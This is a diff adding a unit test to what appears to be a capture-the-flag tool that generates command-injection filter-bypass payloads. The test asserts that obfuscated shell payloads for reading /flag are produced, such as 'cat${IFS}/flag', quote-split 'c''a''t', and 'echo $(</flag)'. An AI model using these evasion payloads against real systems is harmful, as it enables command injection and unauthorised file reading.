@@ -92,6 +92,25 @@ class TestNewTechniques(unittest.TestCase):
         found_grep = any("grep" in p and "flag" in p for p in payloads)
         self.assertTrue(found_grep, "grep command not found")
 
+    def test_commix_inspired_readfile_payloads(self):
+        options = bypass.BypassOptions(
+            flagfile="/flag",
+            read_env=False,
+            reflect_shell=False,
+            ip="127.0.0.1",
+            port=8080,
+            phpinfo=False,
+            php_version=8.0,
+        )
+        payloads = bypass.generate_candidates(options)
+
+        self.assertIn("cat${IFS}/flag", payloads)
+        self.assertIn("c''a''t /flag", payloads)
+        self.assertIn('c""a""t /flag', payloads)
+        self.assertNotIn("c\\a\\t /flag", payloads)
+        self.assertIn("echo $(</flag)", payloads)
+        self.assertIn("while read line;do echo $line;done</flag", payloads)
+
     def test_directory_enumeration_templates(self):
         options = bypass.BypassOptions(
             flagfile="/",
